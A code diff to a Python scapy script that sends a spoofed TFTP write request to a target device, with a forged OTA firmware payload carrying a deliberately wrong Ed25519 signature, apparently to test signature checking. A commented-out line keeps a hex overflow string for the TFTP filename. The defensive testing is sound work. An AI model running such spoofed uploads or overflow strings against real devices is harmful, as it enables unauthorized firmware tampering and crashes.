@@ -9,10 +9,16 @@ def spoofTFTP(hostIP, targetIP, TFTPPort):
     print (f"TargetIP is {targetIP}\n");
     print (f"TFTPPort is {TFTPPort}\n");
 
-    #attackString = bytearray.fromhex("6c 6d 63 6f 64 65 6d 6f 2e 68 74 6d 2e 73 69 67 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c  6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c e0 6d 1b c0 ec c8 01 c0 00").decode()
+    #attackString = bytearray.fromhex("6c 6d 63 6f 64 65 6d 6f 2e 68 74 6d 2e 73 69 67 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c  6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c e0 6d 1b c0 ec c8 01 c0").decode()
+
+    # demo_data is a forged OTA payload, consisting of 85 bytes:
+    #   64 bytes of (incorrect) Ed25519 signature
+    #   21 character ASCII String "This should not work\n"
+    demo_data = bytearray.fromhex("93 cd 69 8a 13 bd e1 dc 4b 38 0e ad 2c 05 f2 15 7b 50 95 b8 b3 f7 1b 65 ed 60 05 ef 97 f1 de 0d b1 70 d7 55 f5 56 c7 41 5d 73 9d 78 4e d6 af 84 b6 ff 20 00 ff 73 33 ab 7d 5e c1 5f e9 e3 48 0b 54 68 69 73 20 73 68 6f 75 6c 64 20 6e 6f 74 20 77 6f 72 6b 0a").decode('latin_1')
 
     basic_pkt = scapy.IP(src=hostIP,dst=targetIP)
-    sport=scapy.RandShort()
+    sport = 49152 # arbitrary, but avoid use of scapy.RandShort()
+    print(f"Host source port is {sport}")
     b = basic_pkt/scapy.UDP(sport=sport,dport=TFTPPort)
     c = b/scapy.TFTP(op=2)
 
@@ -23,27 +29,30 @@ def spoofTFTP(hostIP, targetIP, TFTPPort):
     d.show()
     print (d)
     print ("Sending...")
-    r = scapy.sr1(d, timeout=3, verbose=True)
+    r = None
 
-    r[scapy.UDP].dport = TFTPPort
-    r = r.__class__(str(r))
-    if scapy.TFTP_ERROR in r:
-        print (r[scapy.TFTP_ERROR].errormsg)
-        sys.exit(0)
+    while not r or scapy.UDP not in r:
+        r = scapy.sr1(d, timeout=3, verbose=True)
+
     print ("Response is")
-    print (r)
+    r.show()
 
-    dport = r[scapy.UDP].sport
+    new_dport = r[scapy.UDP].sport
+    new_sport = sport
     print ("Target DATA port is")
-    print (dport)
+    print (new_dport)
     print ("Source DATA port is")
-    print (sport)
+    print (new_sport)
 
-    DATA=basic_pkt/scapy.UDP(sport=sport, dport=dport)/scapy.TFTP(op=3)/scapy.TFTP_DATA(block=1)/Raw(load="this is a test")
-    r2 = scapy.sr1(DATA, timeout=3, verbose=True)
-    r2 = r2.__class__(str(r2))
+    DATA = basic_pkt/scapy.UDP(sport=new_sport, dport=new_dport)/scapy.TFTP(op=3)/scapy.TFTP_DATA(block=1)/scapy.Raw(load=demo_data)
+    print ("DATA is")
+    DATA.show()
+
+    r2 = None
+    while not r2 or scapy.UDP not in r2:
+        r2 = scapy.sr1(DATA, timeout=3, verbose=True)
     print ("Response2 is")
-    print (r2)
+    r2.show()
 
     # Much more to do here ..
     #  check r
